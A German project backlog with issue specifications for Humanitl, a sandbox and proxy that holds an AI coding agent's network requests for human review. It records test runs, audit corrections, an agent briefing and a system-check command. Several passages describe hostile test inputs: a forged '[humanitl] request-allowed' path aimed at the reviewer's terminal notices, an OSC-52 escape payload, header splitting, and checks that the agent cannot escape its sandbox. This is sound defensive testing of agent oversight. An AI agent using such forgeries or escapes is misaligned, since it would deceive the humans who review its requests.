- [x] `e2e-agent` grün in CI, Laufzeit unter 3 min, Zusicherungszahl stimmt. Gemessen: lokaler Lauf 3,8 s und 95 Zusicherungen (2026-09-06), und das letzte Drittel am selben Tag am Lauf `34034257162` über `92980c4`: Job `e2e-agent` grün in 59 s, also unter dem Drittel der zugesagten drei Minuten.
- [x] Lokal mit installiertem OpenCode: `m3_real_opencode` grün; ohne OpenCode meldet der Lauf `skip`, nie `pass`. **Beide Hälften gemessen am 2026-09-07.** Der Lauf findet OpenCode über den Sandbox-Pfad, über den `PATH` des Aufrufers und über `M3_OPENCODE_BIN`, löst Symlinks auf und hängt, wenn das Binary außerhalb dessen liegt, was die Sandbox ohnehin sieht, genau sein Verzeichnis nur lesend ein: Sandbox-Profil `m3-opencode`, das mitgelieferte mit drei geänderten Zeilen (`name`, `extra_ro`, `PATH`). Der Schlüssel `sandbox.profile` geht erst **vor Schritt 13** in die Konfiguration, und der Daemon wird dafür neu gestartet — er liest sie beim Start, und die Schritte 1 bis 12 sollen unter dem ausgelieferten Profil laufen, damit ein lokaler Lauf dasselbe misst wie CI (gemessen: `profile default` davor, `profile m3-opencode` in Schritt 13). Vor der ersten Zusicherung fragt der Lauf mit `--version`, ob das gefundene Binary drinnen überhaupt läuft, und überspringt sonst mit dem Satz, der sagt warum. **Mit `M3_OPENCODE_BIN=~/.opencode/bin/opencode`: `M3 demo: OK` (die Zahl der Zusicherungen wandert mit dem Lauf und steht dort; an jenem Tag waren es 122, am selben Tag 124 nach der Modellauswahl von HUM-037 und danach mehr, als HUM-067 die zweite Sitzung des echten Agenten dazunahm)** — der echte Agent startet in der Sandbox, alle drei Garantien grün, er wählt das Modell dieser Sitzung (`> build · mock`), spricht über die Durchreiche mit dem lokalen Modell, holt seinen Katalog nicht aus dem Netz (weder `models.dev` noch `models.opencode.ai`) und lässt niemanden warten. Möglich wurde das durch HUM-135: Bis dahin bekam ein genanntes Kommando den Adapter nicht, also lief OpenCode ohne seine Konfiguration. **Zwei Dinge, die dazugehören und hier stehen sollen.** Die Sitzung läuft unter einer Schranke (`M3_OPENCODE_SECONDS`, Vorgabe 60): Das Mock-Modell antwortet auf jede Anfrage dasselbe, also kommt ein echter Agent nie ans Ziel und fragt weiter — gemessen über zehn Minuten und 157 KB Transkript, alles Verkehr mit dem lokalen Modell. Und ohne OpenCode bleibt es beim `skip`: Auf dieser Maschine ist `~/.local/bin/opencode` ein Wrapper, der eine eigene Sandbox aufmacht und drinnen an `bwrap: Creating new namespace failed` scheitert; der Lauf sagt genau das und endet `OK with gaps` mit 111 Zusicherungen. In CI gibt es kein OpenCode, dort gilt dasselbe.
- [x] Artefakte enthalten das Agenten-Transkript; `[humanitl] request held` und `[humanitl] request allowed` stehen darin. HUM-042 steht, also ist der Stolperdraht eine Zusicherung; die Hinweiszeilen liegen im zweiten Transkript (`attached.transcript`), weil `humanitl run` sie nicht sieht (CONVENTIONS 4.29).

### Stand (2026-09-04): Größe L, zwei Drittel trägt die Shell-Harness, der Rest wartet auf vier ungebaute Issues

Audit von 28 Agenten gegen den Code: 20 Widersprüche, 10 blockierend, oben im Text korrigiert. Was trägt: `tests/e2e/lib.sh` (Namensraum mit `198.51.100.7` auf `lo`, `start_daemon`, `sandbox_run`, `wait_for_held`, `flow_decide`, Zusicherungszähler), `m2_first_decision/run.sh` als Vorlage, `fake_upstream.py` und `fake_agent.py` in Python, die `config.toml`-Vorlage, `rules/default.yaml` mit der Block-Regel `…0001`, die Durchreiche mit `allow_private` und engen Präfixen, die vier Ränge aus HUM-104, `ListFlows` mit `include_passthrough`, die Jobs `e2e` und `e2e-xvfb`. Daher L statt S: die erste Fassung setzte eine Crate, zwei Features, ein Proto-Feld, einen Konfigurationsschlüssel und vier ungebaute Issues voraus.

**Blockierend in der ersten Fassung, jetzt korrigiert:**

- `tests/e2e/m3_agent_inside.rs`, `cargo test -p humanitl-e2e --features escape,test-hooks`: keine Crate `humanitl-e2e` unter den Workspace-Mitgliedern, kein `[features]` in irgendeiner `Cargo.toml`. Das Gate ist Shell.
- `experimental.upstream_override` hinter `#[cfg(feature = "test-hooks")]`: kommt in keiner Datei außer dieser Spezifikation vor.
- Zweites Ziel auf `127.0.0.1` mit `200`: unmöglich, `PrivateAddress` (siehe Netz).
- `Sandbox(Start { cli_overrides })`: `Start` hat `profile`, `work_dir`, `work_mode`, `command`; `agent.command` deckt `command`, der Endpoint geht über die Umgebung.
- Drei `IsolationResult` aus `Sandbox(Start)`: Typ heißt `CheckResult`, und der Dienst sendet ihn nicht (HUM-041).
- `Terminal`-Stream und die Hinweiszeilen: `unimplemented("Terminal", "HUM-042")`; `TerminalOutput` hat kein `Notice`, `ui.terminal_notices` steht nicht in `UiConfig`.
- `SessionEnded { summary }` und `humanitl sessions summary`: nirgends (HUM-043).
- `humanitld --config`: den Schalter gibt es nicht.
- `humanitl run --profile llm-only` als zweiter Test: `run.rs` startet nichts (HUM-067), und `403` verlangt dessen Regel-Verdrahtung.
- Weiter korrigiert: axum-Bin (CONVENTIONS 4.22 hat dieselbe Vorgabe schon einmal verworfen); `SandboxFile` von außen (kein Mechanismus, und keiner nötig); `expectrl` (in keinem Manifest); `ListFlows` ohne `include_passthrough` und Reihenfolge; `https` in STEP3 ohne Wurzel; `Decided { passthrough: true }` (Merkmal ist `DecisionSource`); „`e2e-xvfb` in Sprint 4" (existiert, fährt M2); Prompt-Marker aus einer README ohne Marker; `shellcheck` ohne Werkzeug im Gate.

**Offen, hier nicht entschieden:** ob HUM-041, HUM-042, HUM-043, HUM-067 vor HUM-046 fertig werden oder der Lauf mit Stolperdrähten zuerst landet (Empfehlung des Audits: zuerst der Lauf, die vier Nachträge als eigene Issues); ob `humanitl flows list` einen Schalter für `include_passthrough` bekommt (Paritätslücke, ADR-018).

**Aus dem Audit nicht bestätigt:** die Aussage, HUM-101 (`backlog/sprint-3.md`) nenne `upstream_override` ausdrücklich — HUM-101 tut das nicht; der Bezeichner steht nur in diesem Issue. Die Zeile `rules/default.yaml:38` ist heute Zeile 45.

**Feindliche Eingabe:** drei Stellen, eine davon ist der Zweck des Laufs. (1) Die Hinweiszeile im Terminal wird aus Methode, Host und Pfad des Agenten gebaut und in den Strom geschrieben, den ein Mensch liest; ein Pfad mit CR, LF oder CSI fälscht eine zweite Zeile oder überschreibt die echte. M3 ist der einzige Lauf mit echtem Agenten, echtem Halten und echtem Terminal zugleich; Schritt 9 misst deshalb die Fälschung, nicht nur das Erscheinen. (2) Die Antwortkörper des Agenten (SSE-Token, Block-Body) landen im aufgefangenen stdout, das als CI-Artefakt im Browser geöffnet wird — der deklarierte Kanal aus BACKLOG.md 4.2; bis HUM-042 wird gemessen, dass kein `ESC ]` durchkommt. (3) Die Block-Notiz aus HUM-072 geht in den Kopf `X-Humanitl-Note` und den 403-Body; die Proto beschreibt die Säuberung (500 Zeichen, CR/LF zu Leerzeichen, Steuerzeichen unter 0x20 außer Tab entfernt); ein Header-Splitting wäre ein Request-Smuggling-Primitiv, kein Schönheitsfehler, deshalb Schritt 10. Keine Grenze: `/_debug/last`, nur vom Host erreichbar.

### Stand (2026-09-06): gebaut, in der vollen Fassung; fünf Stolperdrähte sind Zusicherungen geworden, zwei bleiben

Der Lauf steht unter `tests/e2e/m3_agent_inside/run.sh`, das Sprachmodell unter `tests/e2e/mock_llm/`, der CI-Job heißt `e2e-agent`. Die dauerhaften Abweichungen stehen in `backlog/CONVENTIONS.md` 4.29; hier steht, was gegenüber der Spezifikation oben anders ist und warum.

**Die Spezifikation ist an fünf Stellen überholt, und zwar zugunsten des Laufs.** Sie ist geschrieben, als HUM-041, HUM-042, HUM-043, HUM-067 und HUM-087 offen waren, und verlangt deshalb Stolperdrähte. Alle fünf sind gemergt. Damit fällt der Grund für die reduzierte Fassung weg: Der Lauf fährt über `humanitl run`, liest die drei Garantien als Ereignis des Daemons, hängt ein zweites Terminal an, prüft die Hinweiszeilen, holt die Zusammenfassung und geht über `https`. Was in der Spezifikation als Stolperdraht steht, ist im Lauf eine Zusicherung; nur `humanitl audit` (HUM-070) und der fehlende Schalter für `include_passthrough` bleiben Stolperdrähte, und beide sind so geschrieben, dass sie rot werden, sobald das Fehlende da ist.

**Vier Punkte der Spezifikation sind falsch, nicht nur überholt.**

- *Schritt 3 verlangt `humanitl --json flows list 'host:198.51.100.7'` mit `include_passthrough` und ein Feld `decision_source`.* Die Kommandozeile kann das nicht: `daemon/bin/humanitl/src/cmd/flows.rs` setzt `include_passthrough: false` fest, die Zeile trägt `passthrough` als Bool und kein `decision_source`, und ein Filterwort `passthrough:true` hebt sich mit dem `passthrough:false` auf, das der Dienst selbst anhängt (`server.rs`, `flow_query`). Der Lauf misst die Durchreiche deshalb an drei anderen Quellen (CONVENTIONS 4.29). Gemessen: `humanitl --json flows list 'passthrough:true'` liefert `{"flows":[],"total":0}`, während der Fluss in der Aufzeichnung steht.
- *Schritt 9 will einen Pfad mit `\r\n[humanitl] allowed` und einer OSC-52-Nutzlast.* Über HTTP geht davon nichts: Ein Request-Target darf weder CR noch LF noch `ESC` tragen, die Rahmung bräche vorher. Der einzige Vektor, der ankommt, ist die eckige Klammer; der Lauf nimmt `/a[humanitl]request-allowed` und misst beide Seiten. Die OSC-52-Nutzlast misst er dort, wo sie wirklich hinkommt: Der Agent schreibt sie in seine eigene Ausgabe, und der Filter des Daemons nimmt sie heraus, während die Farbfolge daneben stehen bleibt.
- *Der dritte Test soll auf `command -v opencode` prüfen.* Das ist die falsche Frage. Die Sandbox hängt nur `/usr` ein und hat `PATH=/usr/local/bin:/usr/bin:/bin`; ein `opencode` unter `~/.local/bin` — der übliche Ort — ist drinnen unerreichbar. Der Lauf sucht deshalb in genau diesen drei Verzeichnissen und sagt beim Überspringen, dass das Binary am falschen Ort liegt, statt drinnen an `AGENT_004` zu scheitern.
- *Der Lauf soll `sandbox_run` aus `lib.sh` benutzen und das Projekt nach `$E2E_WORKDIR/work` legen.* Über `humanitl run` geht das nicht: `SandboxService::check_work_dir` nimmt nur ein Verzeichnis unter `$HOME` oder das aus `sandbox.work_dir` an und antwortet sonst mit `SANDBOX_006`. Das Projekt liegt deshalb unter `$E2E_WORKDIR/home/project`, und `humanitl run` läuft ohne `--work` darin.

**Zwei Befunde, die der Lauf gefunden hat und die nicht zu ihm gehören.** Erstens: Die Hinweiszeilen des Daemons stehen nur im `Terminal`-Strom, nicht im `Sandbox`-Strom — wer `humanitl run` fährt, sieht sie nicht, erst ein `humanitl sandbox attach` zeigt sie. Zweitens, und schwerer: `HeldNotices::run` meldet seinen Zuhörer erst nach der Isolationsprüfung an, während der Agent schon läuft; eine Entscheidung, die in dieses Fenster fällt, wird nie angesagt. Bei einer gehaltenen Anfrage ist das folgenlos, bei einer, die eine Regel oder die Durchreiche sofort entscheidet, verliert ein Mensch die Zeile. Gemessen an zwei aufeinanderfolgenden Läufen, in denen die Zeile einmal stand und einmal nicht. Der Lauf gibt dem Agenten deshalb eine Sekunde Vorlauf und zählt nur `request held`; die Lücke gehört in ein eigenes Issue.

**Was der Lauf prüft, in Zahlen.** 95 Zusicherungen ohne die OpenCode-Variante, 10 mit ihr. Vier sichtbare Flüsse in der ersten Sitzung (Katalog geblockt, Anfrage freigegeben, gefälschter Pfad freigegeben, Notiz-Block), fünf nach der zweiten. Zehn SSE-Rahmen beim Agenten, mit mindestens 0,15 s zwischen dem ersten und dem letzten Byte. Zwei Inferenzanfragen am Mock, beide als Strom bedient. Zwei bediente Anfragen am zweiten Ziel, beide über TLS. Drei `request held`-Zeilen im angehängten Terminal. Laufzeit unter fünf Sekunden ohne das Bauen, also weit unter den drei Minuten der Akzeptanzkriterien; in CI kommt der Bau dazu, und dafür stehen 30 Minuten im Job.

**Der zweite Test heißt jetzt anders und läuft mit.** Aus `m3_cli_llm_only` ist Schritt 12 desselben Laufs geworden: eine zweite Sitzung mit `humanitl run --profile llm-only`, ohne wartenden Menschen. Sie belegt, dass die Regeln eines Profils verdrahtet sind (`block host "**"` liefert `403` mit `reason: rule`, nicht `504`) und dass die Durchreiche in Rang 1 davor trifft. Ein eigener Prozessbaum nur dafür hätte dieselbe Aussage zum doppelten Preis gebracht.

**Aus dem ersten Review (Antigravity) übernommen.** Null blockierende Befunde, zwei schwere, fünf kleine; sechs davon behoben, einer war schon vom Koordinator erledigt. Der Ausgang aller drei Sitzungen war vorher ein Kommentar (`|| e2e_say "… exited non-zero"`) und ist jetzt ein Messwert; die OpenCode-Variante bleibt die begründete Ausnahme und prüft statt dessen, dass Humanitl selbst nicht abgelehnt hat (nicht 2, 3 oder 4). Jeder `curl` in beiden Agentenskripten und im eigenen Test des Mocks trägt jetzt `--max-time`, sonst hinge ein Lauf an einem Gegenüber, das mitten in der Antwort stehenbleibt, bis zum 30-Minuten-Abbruch der CI. Die Prüfung am angehängten Terminal hat denselben positiven Anker bekommen wie die am Transkript des Agenten, der Status von STEP4 wird jetzt gelesen, und der Mock lehnt ein Modell ab, das er nicht bedient (dazu `llm.models = ["mock"]` in der `config.toml` des Laufs, damit ein echtes OpenCode denselben Namen schickt) und schreibt seinen Zustand unter einer Sperre. Zu jedem Befund eine Mutationsprobe, alle sechs belegt: Exit 7 im Agenten und Exit 5 im llm-only-Agenten färben den Lauf rot an genau der neuen Zeile; ein Mock, der 600 s schweigt, endet nach 24 s rot mit `curl: (28) Operation timed out after 20001 milliseconds` statt zu hängen; ein Anhang ohne Farbfolge färbt nur den neuen Anker rot, während die Hinweiszeilen grün bleiben; ein STEP4, das etwas anderes als den Status meldet, färbt nur die neue Zeile rot; und ein Mock, der wieder jedes Modell annimmt, färbt seinen eigenen Test rot.

**Aus dem zweiten Review (Codex) übernommen, und die nützlichste Zeile dieses Issues.** Null blockierende Befunde, vier schwere, zwei kleine — und alle drei inhaltlich schweren lagen in Schritt 13, dem OpenCode-Zweig, dem einzigen, der auf dieser Maschine nie gefahren werden konnte. Das ist kein Zufall: In Code, der nie läuft, sammelt sich genau diese Sorte Zusicherung, weil nichts sie je widerlegt. Die drei Schatten: „der echte Agent hat das Sprachmodell erreicht" zählte die Summe aller Mock-Zeilen gegen `> 2` und war schon vor dem Start wahr (vier Zeilen aus den beiden Skript-Sitzungen); „die drei Garantien hielten auch für ihn" prüfte nur `no network interface`; „hat den Katalog nie geholt" prüfte, dass kein Fluss dorthin **erlaubt** wurde, und wäre bei einem echten, von der Regel geblockten Abruf grün geblieben. Alle drei sind jetzt Differenzen beziehungsweise Einzelprüfungen: die Zähler werden vor dem Lauf aufgenommen, alle drei Garantien einzeln geprüft, und die Zahl der Flüsse zu beiden Katalog-Hosts muss unverändert bleiben. Dazu, ausserhalb des Zweigs: Beide Server lesen ihre Bereitschaft jetzt mit einer Frist von 20 s und einem Blick auf den Prozess statt unbegrenzt aus einer Fifo (ein Mock, der vor `READY` stirbt, färbt den Lauf nach 0 s rot, einer, der schweigt, nach 22 s — vorher wäre beides der 30-Minuten-Abbruch der CI gewesen), und die Flow-Liste steht zweimal in den Artefakten, als `flows-after-first-session.json` und als `flows.json` vom Ende des Laufs.

**Diese zehn Zusicherungen sind nie ausgeführt worden.** Sie sind der ganze Schritt 13, und dort sassen die drei Schatten. Wer den Zweig zum ersten Mal fährt, rechnet damit, dass er etwas findet, und schreibt hierher, was es war:

1. `Humanitl itself did not refuse the real session` — Exit nicht 2, 3 oder 4.
2. `the daemon started a sandbox for the real agent`.
3. `and it had no interface but lo either`.
4. `and exactly one socket, and it was the proxy`.
5. `and seccomp was active in the agent process`.
6. `the real agent added requests of its own to the language model` — Zuwachs am Mock.
7. `and at least one of them was an inference request`.
8. `and never asked the model catalogue host its documentation names` — `models.dev` unverändert.
9. `nor the one the installed version really uses` — `models.opencode.ai` unverändert.
10. `and left nothing waiting for a human`.

Belegt sind die drei reparierten Zeilen ohne einen echten Lauf: Die Zeilen werden aus `run.sh` herausgeschnitten und gegen gestellte Zähler gefahren. In allen drei Fällen wird die neue Fassung rot, während die alte grün geblieben wäre. Ein Ersatz für einen Lauf mit echtem OpenCode ist das nicht.

**Was der Lauf weiterhin nicht sagt.** Nichts über den Bildschirm (die Oberflächen-Hälfte von M3 gehört in `e2e-xvfb` und ist nicht gebaut), nichts über die Audit-Kette (HUM-070), nichts über die Richtung „ohne `--allow-test-ca` gilt die Wurzel nicht" (das misst der Rust-Test aus HUM-087) und nichts über OpenCode, solange das Binary nicht im `PATH` der Sandbox liegt. Der Kopf von `run.sh` zählt dasselbe auf, damit niemand dafür diese Stelle suchen muss.

**Die OpenCode-Variante ist geschrieben, aber noch nie gegen ein echtes OpenCode gelaufen.** Auf der Maschine, auf der sie entstanden ist, liegt `opencode` unter `~/.local/bin`, und `/usr/local/bin` gehört root. Der Zweig ist aus der Spezifikation und dem Verhalten des Adapters abgeleitet, nicht gemessen; welche zehn Zusicherungen das betrifft, steht oben. Das zweite Akzeptanzkriterium ist damit zur Hälfte erfüllt: Das Überspringen ist laut, ausdrücklich und in der letzten Zeile des Laufs sichtbar (`M3 demo: OK with gaps — …`), und `M3_OPENCODE=1` macht daraus einen Fehlschlag; grün gesehen hat die Variante noch niemand.


### Fallstricke
- Der Passthrough funktioniert, weil der Proxy auf dem Host läuft und dort das Ziel erreicht; in der Sandbox gibt es kein Loopback zum Host. Das ist die gewollte Architektur; der Lauf dokumentiert das.
- `HostName::Ip` matcht nur eine Regel mit `ip:`/`cidr:` oder die Durchreiche (exakt); deshalb `example.com` per `resolver.overrides` und nicht eine zweite IP-Regel.
- Timing: Warte-Timeouts großzügig (10 s), Gesamtlaufzeit begrenzen; Zusicherungen, die aus zwei Gründen leer sein könnten, paarweise (CONVENTIONS 4.22).
- Die Agentenausgabe ist ein Bytestrom; Substrings prüfen, keine Escape-Sequenzen voraussetzen.

### Referenzen
BACKLOG.md Abschnitt 8 (Demo-Skript-Regel), Sprint-3-Tabelle; CONVENTIONS.md 3.11, 4.5, 4.21, 4.22; HUM-021, HUM-036 (Vorläufer), HUM-087, HUM-088; `tests/e2e/lib.sh`, `tests/e2e/m2_first_decision/run.sh`.


## HUM-071 · Agent-Briefing
Sprint: 3 · Größe: S · Abhängigkeiten: HUM-037 · Blockiert: HUM-046

### Kontext
ADR-014: Der Agent soll mit etwa 150 Token wissen, wo er ist, dass Warten normal ist, dass ein 403 von Humanitl endgültig ist, und wo er Status abfragen kann. Das Briefing ist Teil des `AgentAdapter`, liegt in der Sandbox-Home, nie in `/work`.

### Ziel
`OpenCodeAdapter::files()` liefert zusätzlich `~/.config/opencode/AGENTS.md` mit dem Inhalt aus `agents/opencode/briefing.<lang>.md`, `lang` aus `ui.language`. Der Text ist gebündelt (`include_str!`), enthält Platzhalter `{llm_host}`, `{timeout}`, `{ask_mode}`, die beim Start ersetzt werden.

### Nicht-Ziel
Kein Briefing-Editor im UI (Post-MVP, Settings `expert`). Keine Adapter außer OpenCode.

### Betroffene Pfade
- `agents/opencode/briefing.en.md`, `briefing.de.md` (neu)
- `daemon/crates/core-types/src/agent/opencode.rs` (`files()` erweitern)
- `daemon/crates/config/src/schema.rs`: `agent.briefing` (`enabled: bool`, Default true, Tier `advanced`)

### Spezifikation
`briefing.en.md` (Wortlaut verbindlich, ≤ 160 Token):

```
# Environment: Humanitl sandbox
You run inside an isolated sandbox with no direct internet access. Every HTTP(S) request you make goes through a proxy where a human reviews it and allows or blocks it. Waiting up to {timeout}s on a request is normal; do not abort or retry while waiting.
- Local LLM at {llm_host} is always allowed.
- A response `403` starting with `Blocked by Humanitl.` is final. Do not retry the same request. Read the `note:` line if present, tell the user what was blocked and why, and propose an alternative.
- Status and current rules: `GET http://humanitl.internal/`. To ask the user for access, `POST http://humanitl.internal/ask` with a one-line reason.
- Never try to bypass the proxy. Tools that ignore the proxy simply fail.
```

`briefing.de.md` ist die Übersetzung mit identischer Struktur. `ask_mode == none` ersetzt Zeile 3 durch „Requests without a rule are blocked automatically; ask the user to add a rule."

### Schritte
1. Vorlagen schreiben, Token zählen (`tiktoken`-Skript in `tools/`), ≤ 160.
2. `files()` erweitern, Platzhalter ersetzen, Test.
3. Prüfen, dass OpenCode die Datei liest: Sandbox starten, im Terminal `opencode` fragen „Wo läufst du?", Antwort enthält „Humanitl".

### Tests
- `opencode::tests::briefing_written_outside_work`: `files()` enthält Pfad unter `$HOME/.config/opencode/`, keiner unter `/work`.
- `opencode::tests::briefing_placeholders_replaced`: kein `{` im Ergebnis.
- e2e in HUM-046: Frage „Wo läufst du?" ⇒ Antwort enthält „Humanitl" oder „sandbox".

### Akzeptanzkriterien
- [x] Datei existiert in der laufenden Sandbox unter `~/.config/opencode/AGENTS.md`.
- [x] `/work` ist nach dem Start byte-identisch (Hash-Vergleich aus HUM-043).
- [x] Beide Sprachen ≤ 160 Token. **Überholt formuliert, gemessen und entschieden:** Die Grenze ist 185, nicht 160 (`TOKEN_BUDGET` in `daemon/crates/sandbox/src/agent/briefing.rs` mit der Begründung; beide Zahlen des Issues stammen aus der Zeit vor dem Meta-Endpunkt und vor der ersten Zählung). Nachgezählt am 2026-09-06 mit `tools/briefing-tokens.py` und `tiktoken 0.14.0`, `o200k_base`, ungünstigster Fall: englisch 162 (`ask_mode=ui`) und 160 (`none`), deutsch 184 und 179 — alle vier unter der geltenden Grenze. Der deutsche Text kostet 13 bis 14 Prozent mehr, weil jeder BPE-Tokenisierer deutsche Wörter feiner zerlegt; ihn unter 160 zu drücken hieße, eine Aussage wegzulassen, die der englische macht.
- [x] `agent.briefing.enabled = false` unterdrückt die Datei.

### Fallstricke
- OpenCode liest projektlokale `AGENTS.md` aus `/work` zusätzlich; das Briefing darf nicht dort landen, sonst wird es committet.
- Wortlaut ist Teil der Sicherheitskommunikation: keine Formulierung, die dem Agenten „Umgehen" als Option nahelegt, auch nicht verneint in Details.

### Referenzen
BACKLOG.md ADR-014; `docs/ARCHITECTURE.md` 8.1; OpenCode Rules-Doku (https://opencode.ai/docs/rules/).

## HUM-073 · Meta-Endpoint `humanitl.internal`
Sprint: 3 · Größe: M · Abhängigkeiten: HUM-039, HUM-072, HUM-022 · Blockiert: HUM-046

### Kontext
ADR-014: Statusabfrage und Bitte an den Nutzer über den einzigen vorhandenen Kanal. Der Proxy beantwortet Requests an den Host `humanitl.internal` selbst, ohne DNS, ohne Upstream, ohne Regelauswertung.

### Ziel
`GET http://humanitl.internal/` liefert `text/plain` mit Session-ID, Ask-Modus, Timeout, LLM-Host und den aktuell gültigen Regeln (eine Zeile pro Regel: `allow  GET,HEAD  *.npmjs.org  session`). `GET /why/<flow-id>` liefert Entscheidung, Grund, Notiz. `POST /ask` mit Freitext-Body (≤ 2 KB) erzeugt `FlowEvent::AgentAsk { text, ts }` und im UI eine Karte „Der Agent bittet um …" mit Button „Regel anlegen" (öffnet HUM-028-Sheet mit vorausgefülltem Host, falls im Text eine URL steht). Alles andere ⇒ `404`, andere Methoden ⇒ `405`.

### Nicht-Ziel
Keine Aktion durch den Agenten: `/ask` legt nie eine Regel an. Kein JSON-API (Post-MVP, wenn Plugins es brauchen). Keine Authentifizierung nötig, da nur aus der Sandbox erreichbar.

### Betroffene Pfade
- `daemon/crates/proxy/src/meta.rs` (neu)
- `daemon/crates/proxy/src/handler.rs`: Weiche vor Regelauswertung, `authority.host == "humanitl.internal"`
- `daemon/crates/core-types/src/flow.rs`: `FlowEvent::AgentAsk`
- `proto/humanitl/v1/humanitl.proto`: `AgentAsk`-Variante
- `app/lib/features/intercept/widgets/agent_ask_card.dart` (neu)

### Spezifikation
- Nur Scheme `http`; `https://humanitl.internal` wird per CONNECT terminiert und dann identisch behandelt (CA ist vertraut).
- `/`-Antwortformat:
```
humanitl session=<id> ask=<ui|terminal|none> timeout=<s> llm=<host:port>
rules (first match wins):
  allow   POST      192.168.1.50:11434  /v1/**   never   (llm passthrough)
  block   *         models.dev          never   (bundled)
  ask     *         *                   default
```
- `/why/<id>`: `decision=<allow|allow_edited|block|timed_out> reason=<…> note=<…>`; unbekannte ID ⇒ `404`.
- `/ask`: Body wird wie die Block-Notiz sanitized (HUM-072), Rate-Limit 10 pro Minute pro Session (danach `429`), Antwort `202 queued`.
- Meta-Requests werden im Recorder als Flow mit `state=Recorded`, `decision=meta` gespeichert (sichtbar in History, Filter `meta:true`), nicht gehalten, nicht auditiert außer `/ask`.

### Schritte
1. `meta.rs` mit Router (drei Pfade), Tests gegen `HoldQueue`-freien Handler.
2. Weiche im Handler vor `RuleSet::evaluate`.
3. `AgentAsk`-Event, Proto, Dart-Spiegel, Karte im Intercept (oben in der Queue, eigener Zustand `agentAsk`, violett wie Passthrough, Icon `message-square`).
4. Briefing (HUM-071) verweist bereits auf die Pfade; Demo in HUM-046 erweitern.

### Tests
- `meta::tests::status_lists_effective_rules` (Session-Regel vor persistenter).
- `meta::tests::why_unknown_404`, `meta::tests::ask_rate_limited`, `meta::tests::ask_creates_event`, `meta::tests::post_root_405`.
- Escape-Test-Ergänzung `esc-3-egress.sh`: `curl http://humanitl.internal/` aus der Sandbox ⇒ 200, kein DNS-Lookup auf dem Host.
- Widget-Test `agent_ask_card_test.dart`: Karte erscheint, „Regel anlegen" öffnet Sheet mit Host.

### Akzeptanzkriterien
- [x] Die drei Pfade antworten wie spezifiziert, andere ⇒ 404/405.
- [x] Kein Resolver-Aufruf für `humanitl.internal` (Resolver-Mock zählt 0).
- [x] `/ask` erzeugt genau eine Karte pro Request, Rate-Limit greift.
- [x] History zeigt Meta-Flows mit Filter `meta:true`. **Erledigt in HUM-103 (2026-09-05).** Anders als hier vorgesehen ohne `decision=meta`: Der Datensatz trägt die Spalte `flows.meta` **neben** der Entscheidung, und `decision` bleibt leer, weil über eine Meta-Anfrage niemand entschieden hat. Der Zustandsautomat bekam den Weg `Received → Recorded` über `TransitionInput::Answer(MetaAnswer)`; der Nachweis trägt keine Angaben, ist außerhalb von `humanitl-core` nicht baubar, und `Flow::apply` prüft im Augenblick des Abschließens, dass dieser Fluss selbst an den reservierten Namen ging — ein Nachweis von einem fremden Meta-Fluss öffnet also keinen gewöhnlichen (ADR-0004, Nachtrag; `backlog/CONVENTIONS.md` 4.27).

### Fallstricke
- Die Weiche muss vor DNS und vor Regelauswertung liegen, sonst landet `humanitl.internal` als `ask` in der Queue oder löst einen Lookup aus.
- Regeln in `/` nie mit Notizen oder `created_from` ausgeben; nur Aktion, Methode, Host, Pfad, Ablauf.
- `/ask`-Text ist Agent-Eingabe: im UI als Klartext rendern, nie als Markdown oder Link.

### Referenzen
BACKLOG.md ADR-014; `docs/ARCHITECTURE.md` 8.3; HUM-072.


## HUM-075 · `humanitl doctor`
Sprint: 3 · Größe: M · Abhängigkeiten: HUM-064, HUM-063, HUM-041 · Blockiert: HUM-044, HUM-077

### Kontext
Prinzip 9 („It just works") gegen Linux-Varianz: bwrap-Versionen, User-Namespace-Einschränkungen (Ubuntu 24.04+ AppArmor), fehlende systemd-User-Session, GNOME ohne AppIndicator, Impeller-Probleme. Vorbild `flutter doctor`: jede Zeile ein Befund mit Fix.

### Ziel
`humanitl doctor [--json]` prüft die Maschine und gibt eine Tabelle `ok|warn|fail` aus, jede Nicht-ok-Zeile mit `Diagnostic` (Code `DOCTOR_001..019`) und `FixAction` (meist `CopyCommand`). Exit 0 bei nur ok/warn, 3 bei fail. Der Setup-Screen (HUM-044) zeigt dieselben Zeilen über RPC `Doctor()` und blockiert den Sandbox-Start bei `fail`.

### Nicht-Ziel
Keine automatische Reparatur mit Root (nur Befehle anbieten). Keine Distro-spezifischen Paketmanager-Aufrufe außer als Text.

### Betroffene Pfade
- `daemon/crates/sandbox/src/doctor.rs` (neu), `daemon/bin/humanitl/src/cmd/doctor.rs` (neu)
- `proto/humanitl/v1/humanitl.proto`: `rpc Doctor(Empty) returns (DoctorReport)`
- `daemon/crates/core-types/src/diagnostics/codes.rs`: Bereich `DOCTOR_`
- `app/lib/features/setup/widgets/doctor_list.dart` (neu)

### Spezifikation
Prüfungen (Reihenfolge = Ausgabe):
| # | Prüfung | ok | fail/warn | Fix |
|---|---|---|---|---|
| 1 | `bwrap --version` ≥ 0.8 | vorhanden | fehlt ⇒ fail `DOCTOR_001` | `sudo apt install bubblewrap` |
| 2 | Userns: `unshare -Ur true` gelingt | ja | nein ⇒ fail `DOCTOR_002`; Ubuntu 24.04 AppArmor-Hinweis wenn `/proc/sys/kernel/apparmor_restrict_unprivileged_userns` = 1 | Text mit `sysctl` bzw. Hinweis, dass System-bwrap profiliert ist und genutzt wird |
| 3 | seccomp: `/proc/self/status` hat `Seccomp` und Kernel ≥ 5.4 | ja | nein ⇒ fail `DOCTOR_003` | Kernel-Update |
| 4 | `$XDG_RUNTIME_DIR` gesetzt, 0700 | ja | nein ⇒ fail `DOCTOR_004` | `loginctl enable-linger`, Hinweis |
| 5 | systemd user session (`systemctl --user is-system-running`) | running | nein ⇒ warn `DOCTOR_005` (Daemon manuell startbar) | Befehl |
| 6 | Daemon-Socket erreichbar, Version passt | ja | nein ⇒ warn `DOCTOR_006` | `humanitl daemon install` |
| 7 | OpenCode im PATH, Version | ja | nein ⇒ warn `DOCTOR_007` | Install-Befehl aus Adapter |
| 8 | LLM-Endpoint antwortet (`/api/tags` oder `/v1/models`) | ja | nein ⇒ warn `DOCTOR_008` | „LLM finden" (HUM-076) |
| 9 | Tray: `libayatana-appindicator3` vorhanden, GNOME ⇒ Extension-Hinweis | ja | warn `DOCTOR_009` | Paket/Extension |
| 10 | GPU/Renderer: `FLUTTER_ENGINE`-Hinweis, NVIDIA + Wayland ⇒ warn `DOCTOR_010` | | | `--no-enable-impeller` |
| 11 | Freier Platz in `$XDG_DATA_HOME` ≥ 1 GB | ja | warn `DOCTOR_011` | Retention |

